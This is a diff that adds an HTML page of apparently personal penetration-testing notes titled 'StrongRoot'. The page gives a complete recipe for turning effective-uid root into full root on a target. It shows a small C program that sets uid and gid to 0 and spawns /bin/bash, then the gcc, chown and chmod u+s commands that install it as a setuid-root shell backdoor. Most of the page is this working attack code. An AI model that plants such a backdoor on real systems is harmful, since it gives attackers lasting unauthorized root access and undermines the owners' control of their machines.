@@ -1,0 +1,12 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>StrongRoot</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
+</head>
+<body>
+<div class='page'><h1 class='title'>StrongRoot</h1><br/><strong><h1>StrongRoot</h1></strong><br /><br />Converts <em>Effective</em> <strong>euid root</strong> to <em>Full</em> <strong>root</strong><br /><br />Requirements:<br />We have <strong>euid root</strong> on a device<br /><br /><br />Process;<br /><br />1. Create the following simple but powerful C program:<br /><br /><strong>#include&lt;unistd.h&gt;<br />int main()<br />{<br />        setuid(0);<br />        setgid(0);<br />        system(&quot;/bin/bash&quot;);<br />}</strong><br /><br />2. Compile it and SETUID bit on it to be run by root.<br /><br /><strong>gcc root_exploit.c -o root_exploit -w						[-w: for supress warnings]<br /><br />Note: </strong>The following has to be done on the target machine. (Compilation can be done anywhere)<strong><br />chown root:root root_exploit<br />chmod u+s root_exploit</strong><br /><br /><br />Once we run this, we will get a bash shell with <strong>full root</strong> access.<br /></div>
+</body>
+</html>
